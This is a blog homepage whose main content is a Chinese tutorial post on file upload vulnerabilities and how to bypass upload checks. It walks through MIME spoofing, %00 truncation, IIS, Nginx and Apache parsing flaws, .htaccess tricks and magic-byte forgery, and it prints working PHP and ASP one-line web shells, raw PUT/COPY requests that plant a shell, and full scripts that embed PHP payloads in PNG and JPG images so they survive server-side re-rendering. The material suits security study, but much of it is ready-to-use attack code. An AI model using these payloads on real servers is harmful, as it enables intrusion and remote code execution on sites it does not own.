
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
        <title>Hexo</title>
        <meta name="author" content="John Doe">
        <meta name="description" content="">
        <meta name="keywords" content="">
        <link rel="icon" href="">
        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
        <script src="https://cdn.staticfile.org/font-awesome/6.1.1/js/all.min.js"></script>
        
        <link rel="stylesheet" href="/css/fonts.min.css">
        <link rel="stylesheet" href="/css/particlex.css">
        
        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
    <meta name="generator" content="Hexo 6.2.0"></head>
    <body>
        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:200;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:50vmin;height:50vmin;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #a3ddfb;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">加载过慢请开启缓存(浏览器默认开启)</p><div><img alt="loading" src="/loading.gif"></div></div></div></div></div>
        <div id="layout">
            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
            <transition name="into">
                <div v-show="show_page" style="display: -not-none">
                    <div id="menu_show">
                         
<nav id="menu">
    <div class="desktop-menu">
        <a href="/">
            <span class="title">Hexo</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;about</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;tags</span>
        </a>
        
    </div>
    <div :class="'phone-menu ' + menu_show" id="phone-menu">
        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
        <div :class="'title'" @click="menu_show = !menu_show">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;Hexo</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="menu_show">
            
            <a href="">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">home</div>
                </div>
            </a>
            
            <a href="about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">about</div>
                </div>
            </a>
            
            <a href="archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">archives</div>
                </div>
            </a>
            
            <a href="categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">categories</div>
                </div>
            </a>
            
            <a href="tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">tags</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>
                    </div>
                    <div id="main">
                        <div id="home-head">
    <div id="home-background" style="background-image: url()"></div>
    
    <div id="home-info" class="home-info" @click="home_click">
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="info">
            <div class="wrap">
                <h1>Hexo</h1>
                <h3></h3>
                <h5></h5>
            </div>
        </span>
    </div>
    
</div>

<div id="home-posts-wrap" class=>
    <div id="home-posts">
        <div id="posts">
            

<div class="post">
    <a href="/2022/08/24/九，文件上传漏洞/">
        <h2>
            
        </h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
            </span>
            2022/8/24
        </span>
    </div>
    <div class="excerpt">
        <div class="content" v-pre>
            
            <h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>一些web应用程序中允许上传图片、视频、头像和许多其他类型的文件到服务器中。</p>
<p>文件上传漏洞就是利用服务端代码对文件上传路径变量过滤不严格将可执行的文件上传到一个到服务器中 ，再通过URL去访问以执行恶意代码。</p>
<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>网站WEB应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门</p>
<p>常见上传点：</p>
<ol>
<li><code>上传头像</code></li>
<li><code>上传相册</code></li>
<li><code>上传附件</code></li>
<li><code>添加文章图片</code></li>
<li><code>前台留言资料上传</code></li>
<li><code>编辑器文件上传</code></li>
</ol>
<h2 id="检测与绕过"><a href="#检测与绕过" class="headerlink" title="检测与绕过"></a>检测与绕过</h2><h3 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h3><p>直接上传一句话木马或shell脚本即可</p>
<h3 id="客户端检测（Javascript检测）"><a href="#客户端检测（Javascript检测）" class="headerlink" title="客户端检测（Javascript检测）"></a>客户端检测（Javascript检测）</h3><p>在网页上写一段Javascript脚本，效验文件上传的后缀名，有白名单形式也有黑名单形式。如果上传文件的后缀不被允许，则会弹窗告知，此时文件上传的数据包并没有发送到服务端，只是在客户端浏览器使用Javascript对数据包进行检测。</p>
<p>这时有两种方法可以绕过客户端Javascript的检测：</p>
<blockquote>
<ul>
<li>使用浏览器插件，删除检测文件后缀的Javascript代码，然后上传文件即可绕过</li>
<li>首先把需要上传的文件后缀改成允许上传的文件类型，如jpg、png、gif等，绕过Javascript检测，再抓包，把后缀名改成可执行文件的后缀即可上传成功</li>
</ul>
</blockquote>
<h3 id="服务端检测（MINE类型检测）"><a href="#服务端检测（MINE类型检测）" class="headerlink" title="服务端检测（MINE类型检测）"></a>服务端检测（MINE类型检测）</h3><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。</p>
<p>服务器代码判断$_FILES[”file“][“type”]是不是图片格式（<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>），如果不是，则不允许上传该文件。</p>
<p>绕过方法：</p>
<blockquote>
<p>抓包后更改Content-Type为允许的类型绕过该代码限制，比如将php文件的<code>Content-Type:application/octet-stream</code>修改为<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>等就可以</p>
</blockquote>
<p>常见MIMETYPE</p>
<blockquote>
<p>audio&#x2F;mpeg -&gt; .mp3 application&#x2F;msword -&gt; .doc application&#x2F;octet-stream -&gt; .exe application&#x2F;pdf -&gt; .pdf application&#x2F;x-javascript -&gt; .js application&#x2F;x-rar -&gt; .rar application&#x2F;zip -&gt; .zip image&#x2F;gif -&gt; .gif image&#x2F;jpeg -&gt; .jpg &#x2F; .jpeg image&#x2F;png -&gt; .png text&#x2F;plain -&gt; .txt text&#x2F;html -&gt; .html video&#x2F;mp4 -&gt; .mp4</p>
</blockquote>
<h3 id="服务端检测（目录路径检测）"><a href="#服务端检测（目录路径检测）" class="headerlink" title="服务端检测（目录路径检测）"></a>服务端检测（目录路径检测）</h3><p>虽然提供了名单检测，但在上传文件时，服务端采用了路径拼接的方式保存文件，而路径我们可以控制。可以采用%00截断，检测时在%00添加合法后缀通过检测，后端获取路径时会当作空格舍弃后面的内容。</p>
<p>绕过方法:</p>
<blockquote>
<ul>
<li>例如：&#x2F;111.php%00.gif&#x2F;111.gif -&gt; &#x2F;111.php</li>
</ul>
</blockquote>
<h3 id="服务端检测（文件扩展名检测）"><a href="#服务端检测（文件扩展名检测）" class="headerlink" title="服务端检测（文件扩展名检测）"></a>服务端检测（文件扩展名检测）</h3><p>绕过方法：</p>
<h4 id="使用其它后缀文件"><a href="#使用其它后缀文件" class="headerlink" title="使用其它后缀文件"></a>使用其它后缀文件</h4><pre><code>PHP:
php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定)
ASP：
asa、cer、cdx
ASPX：
ascx、ashx、asac
JSP：
jsp、jspx、jspf
</code></pre>
<h4 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="%00截断绕过"></a>%00截断绕过</h4><p>采用保存文件的时候，是路径拼接的形式，而路径又是从前端获取，所以我们可以采用在路径上截断。</p>
<p>通过抓包截断将 backlion.asp.jpg 后面的一个.换成%00 在上传的时候即 backlion.asp%00.jpg，当文件系统读到%00 时，会认为文件已经结束，从而将 backlion.asp.jpg 的内容写入到 backlion.asp 中，从而达到攻击的目的。%00 不是针对所有基于白名单的后缀名检查都能绕过，代码的实现过程中必须存在截 断上传漏洞，上传格式如下：bk.asp%00.jpg</p>
<p>注意：如果%00截断在POST，因为POST不会像GET对%00进行自动解码，所以需要在二进制中进行修改。</p>
<h4 id="利用文件解析规则绕过"><a href="#利用文件解析规则绕过" class="headerlink" title="利用文件解析规则绕过"></a>利用文件解析规则绕过</h4><p> 上传文件漏洞在不同的系统、架构以及行为中，利用形式也是各不相同。常用的web容器有IIS、Tomcat、Nginx、Apache等。以下主要以比较经典的解析漏洞做解释</p>
<h5 id="IIS-5-x-x2F-6-0解析漏洞"><a href="#IIS-5-x-x2F-6-0解析漏洞" class="headerlink" title="IIS 5.x&#x2F;6.0解析漏洞"></a>IIS 5.x&#x2F;6.0解析漏洞</h5><p>1、当创建.asp的文件目录的时候，在此目录下的任意文件，服务器都解析为asp文件。例如如下：<br>漏洞目录利用形式：<a target="_blank" rel="noopener" href="http://www.xxx.com/xx.asp/xx.jpg%E3%80%82">www.xxx.com/xx.asp/xx.jpg。</a><br>xx.jpg的内容可以为一段合法的asp脚本文件。<br>2、服务器默认不解析”;“以后的内容，导致xx.asp;.jpg被解析成xx.asp<br>漏洞文件利用形式：<a target="_blank" rel="noopener" href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a><br>xx.jpg的内容可以为一段合法的asp脚本文件。</p>
<p>检测流程为：</p>
<pre><code class="none">www.xxx.com/xxx.asp;xxx.jpg
N1:从头部查找查找&quot;.&quot;号,获得&quot;.asp;xxxx.jpg&quot;
N2:查找&quot;;&quot;号,如果有则内存截断
N3:查找&quot;/&quot;,如果有则内存截断
</code></pre>
<p>因此，.asp将最终被保存下来，IIS6只简单地根据扩展名来识别，所以从脚本映射表中里查找脚本与扩展名对比，并利用asp.dll来解析。导致最终的问题产生。</p>
<p>对于此问题，微软并不认为这是一个漏洞，同样也没推出IIS6.0解析漏洞的补丁。因此在IIS6.0的网站下，此问题仍然可以尝试是否存在。</p>
<h5 id="IIS-6-0-PUT上传漏洞"><a href="#IIS-6-0-PUT上传漏洞" class="headerlink" title="IIS 6.0 PUT上传漏洞"></a>IIS 6.0 PUT上传漏洞</h5><p>WebDAV 基于HTTP1.1协议的通信协议使得HTTP支持PUT MOVE COPY DELETE 方法。</p>
<p>探测是否存在IIS PUT漏洞</p>
<pre><code>OPTIONS / HTTP1.1
Host: www.xxx.com
</code></pre>
<p>传txt文本文件</p>
<pre><code> PUT /a.txt HTTP1.1 Host: www.xxx.com Content-Length:30

&lt;%eval request(“cmd”)%&gt;
</code></pre>
<p>通过Move或Copy重名</p>
<pre><code>COPY /a.txt HTTP1.1 Host: www.xxx.com Destination: http://www.xxx.com/cmd.asp
</code></pre>
<p>删除</p>
<pre><code>DELETE /a.txt HTTP1.1 Host: www.xxx.com
</code></pre>
<h5 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h5><p>在低版本Nginx中存在一个由PHP-CGI导致的文件解析漏洞。为什么是由于PHP-CGI的原因呢，因为在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于php.ini配置文件中，默认是开启的，当URL中有不存在的文件时，PHP就会默认向前解析。</p>
<p> 普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。访问 ”<a target="_blank" rel="noopener" href="http://www.xx.com/phpinfo.jpg/1.php%E2%80%9D">www.xx.com/phpinfo.jpg/1.php”</a> 这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg&#x2F;1.php”，然后构造成SCRIPT_FILENAME传递给PHP-CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<p> 在默认Fast-CGI开启状况下上传名字为xx.jpg,内容为:<br><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></p>
<p>然后访问xx.jpg&#x2F;.php,在这个目录下就会生成一句话木马shell.php。同样利用phpstudy说明，上传1.jpg格式的文件，内容为访问phpinfo，即可触发</p>
<h5 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h5><p>Apache 在1.x和2.x版本中存在解析漏洞，例如如下地址格式：</p>
<pre><code class="none">www.xxxx.com/apache.php.bbb.aaa
</code></pre>
<p>Apache从右至左开始判断后缀，若aaa非可识别后缀，再判断bbb，直到找到可识别后缀为止，然后将该可识别后缀进解析，因此如上地址解析为访问apache.php文件</p>
<p>Apache允许文件有多个后缀名，并会按照第一个点来分析文件后缀，例如file.html.en。Apache按照每个点来分割后缀名，因此此文件名为.html、.en。由于en后缀不被识别，便继续向前解析。</p>
<p> 另外对于Apache解析漏洞的正确说法应该是，使用module模式与php结合的所有版本 apache存在未知扩展名解析漏洞，使用fastcig模式与php结合的所有版本apache不存在此漏洞。而是否解析的后缀名在文件mime.types中查找是否出现。</p>
<h4 id="htaccess规则文件绕过"><a href="#htaccess规则文件绕过" class="headerlink" title=".htaccess规则文件绕过"></a>.htaccess规则文件绕过</h4><p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。</p>
<p> 概述来说，.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
<p> 在一些启用了.htaccess文件的网站上就可以使用此文件类型来绕过限制较全面的黑名单过滤。</p>
<ul>
<li>针对黑名单绕过</li>
</ul>
<p>创建一个txt文件，写入</p>
<pre><code class="text">AddType  application/x-httpd-php    .png
</code></pre>
<p>另存为 <code>.htaccess</code> 名称，保存类型为所有文件，即可将<code>png</code>文件解析为<code>php</code>文件。</p>
<ul>
<li>留后门</li>
</ul>
<p>在<code>.htaccess</code> 内写入<code>php</code>解析规则，类似于把文件名包含<code>s</code>的解析成<code>php</code>文件</p>
<pre><code class="text">&lt;FilesMatch &quot;s&quot;&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre>
<p><code>shell.png</code> 就会以<code>php</code>文件执行</p>
<ul>
<li>利用.htaccess进行文件包含</li>
</ul>
<pre><code class="text">php_value auto_prepend_file &quot;.htaccess&quot;
#&lt;?php eval($_POST[cmd]);?&gt;
</code></pre>
<ul>
<li>使用#注释使得.htaccess能够成功解析</li>
</ul>
<h4 id="Windows环境特性绕过"><a href="#Windows环境特性绕过" class="headerlink" title="Windows环境特性绕过"></a>Windows环境特性绕过</h4><p>:$DATA(php在windows的时候如果文件名+”::DATA”会把::DATA之后的数据当作文件流处理，不会检测后缀名，且保持”::DATA”之前的文件名，其目的就是不检查后缀名</p>
<p>即：xxx.php::$DATA &#x3D; xxx.php</p>
<p>windows文件名最后不能有.或空格，可设为<code>*.php.</code>或<code>*.php+</code>进行绕过</p>
<p>windows下文件名不区分大小写，linux下文件名区分大小写</p>
<h4 id="文件名大小写绕过"><a href="#文件名大小写绕过" class="headerlink" title="文件名大小写绕过"></a>文件名大小写绕过</h4><p>针对文件名检查未忽略大小写</p>
<h4 id="点空格绕过"><a href="#点空格绕过" class="headerlink" title="点空格绕过"></a>点空格绕过</h4><p>原理是1.php+(点+空格+点)上传时，</p>
<ul>
<li>首先，删除文件名末尾的点，变成1.php+点+空格，</li>
<li>然后，通过strrchar函数来确认文件的后缀名为.php+点+空格，</li>
<li>接着，将文件的后缀名转换为小写、去除字符串::$DATA、首尾去空，变成.php+点，</li>
<li>最后，判断文件后缀名是否在黑名单内。由于“.php.”不在黑名单中，可以通过校验，而windows特性，保存文件时会自动去掉后缀名中最后的”.”，最终文件成功上传并保存为1.php。</li>
</ul>
<h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>针对会将文件名中的关键词删除的检查</p>
<h4 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h4><h5 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h5><p>找到渲染后未改变的地方，在那写马即可</p>
<h5 id="png"><a href="#png" class="headerlink" title="png"></a>png</h5><h6 id="写入PLTE数据块"><a href="#写入PLTE数据块" class="headerlink" title="写入PLTE数据块"></a>写入PLTE数据块</h6><p>php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以再chunk data域插入php代码,然后重新计算相应的crc值并修改即可.</p>
<p>这种方式只针对索引彩色图像的png图片才有效,在选取png图片时可根据IHDR数据块的color type辨别.<code>03</code>为索引彩色图像.</p>
<p>在PLTE数据块写入php代码：</p>
<p><img src="/%E4%B9%9D%EF%BC%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/image-20220404110032852.png" alt="image-20220404110032852"></p>
<p>计算PLTE数据块的CRC</p>
<pre><code>import binascii
import re

png = open(r&#39;2.png&#39;,&#39;rb&#39;)
a = png.read()
png.close()
hexstr = binascii.b2a_hex(a)

&#39;&#39;&#39; PLTE crc &#39;&#39;&#39;
data =  &#39;504c5445&#39;+ re.findall(&#39;504c5445(.*?)49444154&#39;,hexstr)[0]
crc = binascii.crc32(data[:-16].decode(&#39;hex&#39;)) &amp; 0xffffffff
print hex(crc)
</code></pre>
<p>修改CRC值</p>
<p><img src="/%E4%B9%9D%EF%BC%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/image-20220404110108576.png" alt="image-20220404110108576"></p>
<h6 id="写入IDAT数据块"><a href="#写入IDAT数据块" class="headerlink" title="写入IDAT数据块"></a>写入IDAT数据块</h6><p>国外大牛写的脚本,直接拿来运行即可.</p>
<pre><code>&lt;?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
&#125;

imagepng($img,&#39;./1.png&#39;);
?&gt;
</code></pre>
<p>运行后得到1.png</p>
<h5 id="jpg"><a href="#jpg" class="headerlink" title="jpg"></a>jpg</h5><p>采用国外大牛编写的脚本jpg_payload.php</p>
<pre><code>&lt;?php
    /*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php &lt;jpg_name.jpg&gt;

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */

    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;


    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123;
        die(&#39;php-gd is not installed&#39;);
    &#125;

    if(!isset($argv[1])) &#123;
        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);
    &#125;

    set_error_handler(&quot;custom_error_handler&quot;);

    for($pad = 0; $pad &lt; 1024; $pad++) &#123;
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis-&gt;readShort() != 0xFFD8) &#123;
            die(&#39;Incorrect SOI marker&#39;);
        &#125;

        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;
            $marker = $dis-&gt;readByte();
            $size = $dis-&gt;readShort() - 2;
            $dis-&gt;skip($size);
            if($marker === 0xDA) &#123;
                $startPos = $dis-&gt;seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) &#123;
                    while((!$dis-&gt;eof())) &#123;
                        if($dis-&gt;readByte() === 0xFF) &#123;
                            if($dis-&gt;readByte !== 0x00) &#123;
                                break;
                            &#125;
                        &#125;
                    &#125;
                    $stopPos = $dis-&gt;seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                &#125; elseif($correctImage) &#123;
                    $outStream = $outStreamTmp;
                &#125; else &#123;
                    break;
                &#125;
                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123;
                    die(&#39;Success!&#39;);
                &#125; else &#123;
                    break;
                &#125;
            &#125;
        &#125;
    &#125;
    unlink(&#39;payload_&#39;.$argv[1]);
    die(&#39;Something\&#39;s wrong&#39;);

    function checkImage($filename, $data, $unlink = FALSE) &#123;
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    &#125;

    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) &#123;
            if(isset($m[1])) &#123;
                $extraBytes = (int)$m[1];
            &#125;
        &#125;
    &#125;

    class DataInputStream &#123;
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) &#123;
            $this-&gt;binData = &#39;&#39;;
            $this-&gt;order = $order;
            if(!$fromString) &#123;
                if(!file_exists($filename) || !is_file($filename))
                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);
                $this-&gt;binData = file_get_contents($filename);
            &#125; else &#123;
                $this-&gt;binData = $filename;
            &#125;
            $this-&gt;size = strlen($this-&gt;binData);
        &#125;

        public function seek() &#123;
            return ($this-&gt;size - strlen($this-&gt;binData));
        &#125;

        public function skip($skip) &#123;
            $this-&gt;binData = substr($this-&gt;binData, $skip);
        &#125;

        public function readByte() &#123;
            if($this-&gt;eof()) &#123;
                die(&#39;End Of File&#39;);
            &#125;
            $byte = substr($this-&gt;binData, 0, 1);
            $this-&gt;binData = substr($this-&gt;binData, 1);
            return ord($byte);
        &#125;

        public function readShort() &#123;
            if(strlen($this-&gt;binData) &lt; 2) &#123;
                die(&#39;End Of File&#39;);
            &#125;
            $short = substr($this-&gt;binData, 0, 2);
            $this-&gt;binData = substr($this-&gt;binData, 2);
            if($this-&gt;order) &#123;
                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
            &#125; else &#123;
                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
            &#125;
            return $short;
        &#125;

        public function eof() &#123;
            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);
        &#125;
    &#125;
?&gt;
</code></pre>
<p>随便找一个jpg图片,先上传至服务器然后再下载到本地保存为<code>1.jpg</code>.</p>
<p>使用脚本处理<code>1.jpg</code>,命令<code>php jpg_payload.php 1.jpg</code></p>
<p>需要注意的是,有一些jpg图片不能被处理,所以要多尝试一些jpg图片.</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-2">https://xz.aliyun.com/t/2657#toc-2</a></p>
<h5 id="直接对文件加载器攻击"><a href="#直接对文件加载器攻击" class="headerlink" title="直接对文件加载器攻击"></a>直接对文件加载器攻击</h5><p>对于一些二次渲染</p>
<pre><code class="text">上传文件数据不完整的gif文件 -&gt; 触发报错imagecreatefromgif()函数
上传文件数据不完整的png文件 -&gt; 触发报错imagecreatefrompng()函数
</code></pre>
<p>对文件加载器进行攻击，常见的就是溢出攻击。上传自己的恶意文件后，服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode，比如access&#x2F;mdb溢出。</p>
<p>建议参考CVE</p>
<h4 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a>条件竞争绕过</h4><p>源文件上传后经过检测处理后会删除，那么我们大量上传在删除前访问即可</p>
<h3 id="服务器检测（文件内容检测）"><a href="#服务器检测（文件内容检测）" class="headerlink" title="服务器检测（文件内容检测）"></a>服务器检测（文件内容检测）</h3><h4 id="文件幻数检测（文件开头）"><a href="#文件幻数检测（文件开头）" class="headerlink" title="文件幻数检测（文件开头）"></a>文件幻数检测（文件开头）</h4><p>要绕过文件幻数检测就要在文件开头写上如下的值</p>
<pre><code class="text">.jpg	FF D8 FF E0 00 10 4A 46 49 46
.gif	47 49 46 38 39 61
.png	89 50 4E 47
</code></pre>
<h4 id="文件相关信息检测"><a href="#文件相关信息检测" class="headerlink" title="文件相关信息检测"></a>文件相关信息检测</h4><p>图像文件相关信息检测常用的是getimagesize()函数，需要把文件头部分伪造，也就是在幻数的基础上还加了一些文件信息。</p>
<ul>
<li>例如下面结构</li>
</ul>
<pre><code class="text">GIF89a
(...some binary data for image...)
&lt;?php phpinfo(); ?&gt;
(... skipping the rest of binary data ...)
</code></pre>
<p>另一种是判断是否包含<code>&lt;?</code>或者<code>php</code></p>
<ul>
<li><p>绕过<code>&lt;?</code>：</p>
<pre><code class="text">&lt;script language=&#39;php&#39;&gt;@eval($_POST[cmd]);&lt;/script&gt;
</code></pre>
</li>
<li><p>绕过<code>php</code>：</p>
<pre><code class="text">&lt;?= @eval($_POST[&#39;cmd&#39;]);?&gt;
</code></pre>
</li>
</ul>
<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><h5 id="填充垃圾数据绕过"><a href="#填充垃圾数据绕过" class="headerlink" title="填充垃圾数据绕过"></a>填充垃圾数据绕过</h5><p>有些主机 WAF 软件为了不影响web服务器的性能，会对校验的用户数据设置 大小上限，比如 1M。此种情况可以构造一个大文件，前面 1M 的内容为垃圾内 容，后面才是真正的木马内容，便可以绕过 WAF 对文件内容的校验。可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。</p>
<h5 id="文件扩展名出回车绕过（只支持-php）"><a href="#文件扩展名出回车绕过（只支持-php）" class="headerlink" title="文件扩展名出回车绕过（只支持 php）"></a>文件扩展名出回车绕过（只支持 php）</h5><pre><code>Content-Disposition: form-data; nAme=&quot;upfile&quot;; filename=&quot;bk.ph
p&quot; Content-Type: image/jpeg
</code></pre>
<p>或</p>
<pre><code>Content-Disposition: form-data; nAme=&quot;upfile&quot;; fi
lename=&quot;bk.php&quot; Content-Type: image/jpeg
</code></pre>
